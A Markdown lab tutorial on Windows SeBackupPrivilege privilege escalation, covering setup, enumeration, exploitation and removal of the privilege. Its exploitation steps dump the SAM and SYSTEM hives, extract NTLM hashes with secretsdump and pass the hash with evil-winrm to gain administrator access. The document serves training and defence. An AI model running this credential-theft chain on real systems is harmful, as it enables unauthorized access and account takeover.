# SeBackupPrivilege

## Description

The SeBackupPrivilege is a Windows privilege that provides a user or process with the ability to read files and directories, regardless of the security settings on those objects. This privilege can be used by certain backup programs or processes that require the capability to back up or copy files that would not normally be accessible to the user. 

However, if this privilege is not properly managed or if it is granted to unauthorized users or processes, it can lead to a privilege escalation vulnerability. The SeBackupPrivilege vulnerability can be exploited by malicious actors to gain unauthorized access to sensitive files and data on a system.

## Lab Setup

### Manual Lab Setup

1) Open a PowerShell with local Administrator privileges and run the following command to create a new user:

```
net user ncv Passw0rd! /add
```

2) Run the following command to enable the WinRM service:

```
Enable-PSRemoting -Force
```

:information_source: If you are encountering an error in enabling of WinRM and WinRM is not functioning, please follow these steps:

- Go to Settings > Network & Internet.
- Choose either "Ethernet" or "Wi-Fi," depending on your current network connection.
- Under the network profile, set the location to "Private."
- Lastly, execute the following command with Local Administrator privileges to enable PS remoting: `Set-WSManQuickConfig`.

3) Run the following command to add new user to "Remote Management Users" Group:

```
net localgroup "Remote Management Users" ncv /add
```

4) Run the following commands to install and import the Carbon module:

```
Install-Module -Name carbon -Force
```

 and 

 ```
 Import-Module carbon
 ```

 5) Use the following cmdlets to grant the SeBackupPrivilege to the new user and verify the privilege:

 ```
 Grant-CPrivilege -Identity ncv -Privilege SeBackupPrivilege
 ```

 and

 ```
 Test-CPrivilege -Identity ncv -Privilege SeBackupPrivilege
 ```

Outcome:

![SebackupPrivilege-Manual-Setup](/Pictures/SeBackUp-Manual-Setup.png)

### PowerShell Script Lab Setup 

Another way to set up the lab with the 'SeBackupPrivilege' vulnerability is by using the custom PowerShell script named [SeBackupPrivilege.ps1](/Lab-Setup-Scripts/SeBackupPrivilege.ps1).

Open a PowerShelll with local Administrator privileges and run the script:

```
.\SeBackupPrivilege.ps1
```

Outcome:

![SebackupPrivilege-Script-Setup](/Pictures/SeBackUp-Script.png)

## Enumeration

### Manual Enumeration

To perform manual enumeration, you can open a command prompt and use the following command to enumerate the current privileges of the user:

```
whoami /priv
```

Outcome:

![SeBackupPrivilege-Manual-Enumeration](/Pictures/SeBackUp-Manual-Enum.png)

### Tool Enumeration

To run the [SharpUp](https://github.com/GhostPack/SharpUp) tool and perform an enumeration of the `SeBackupPrivilege` vulnerability, you can execute the following command with appropriate arguments:

```
SharpUp.exe audit TokenPrivileges
```

Outcome:

![SeBackupPrivilege-Tool-Enumeration](/Pictures/SeBackUp-Tool-Enum.png)

## Exploitation

To abuse this vulnerability you should follow these steps:

1) Create a temp directory:

```
mkdir C:\temp
```

2) Copy the sam and system hive of HKLM to C:\temp and then download them.

```
reg save hklm\sam C:\temp\sam.hive
```

and

```
reg save hklm\system C:\temp\system.hive
```

Outcome:

![SeBackupPrivilege-Exploitation-Copy-Hives](/Pictures/SeBackUp-Exploitation-1.png)

3) Use [impacket-secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) tool (Kali Linux Default) and obtain ntlm hashes:

```
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

Outcome:

![SeBackupPrivilege-Exploitation-Observe-NTLM-Hashes](/Pictures/SeBackUp-Exploitation-2.png)

4) Use again evil-winrm to pass the hash and connect as Local Administrator:

```
evil-winrm -i 192.168.146.130 -u "Nikos Vourdas" -H "20117ce437cde2e30f4612c4c82196b0"
```

Outcome:

![SeBackupPrivilege-Exploitation-Evil-WinRM-Pass-The-Hash](/Pictures/SeBackUp-Exploitation-3.png)

## Mitigation

Follow the steps below to remove the `SeBackupPrivilege` from a user:

1) Press Win + R to open the Run dialog, type `secpol.msc`, and hit Enter. This will open the Local Security Policy editor.

2) In the Local Security Policy editor, navigate to **Local Policies** > **User Rights Assignment**.

3) Look for the **Back up files and directories** policy (which corresponds to SeBackupPrivilege).

4) Double-click the policy, and a properties window will appear.

5) In the properties window, you can remove the user or group from the list to revoke the privilege. Click **Apply** and then **OK** to save the changes.
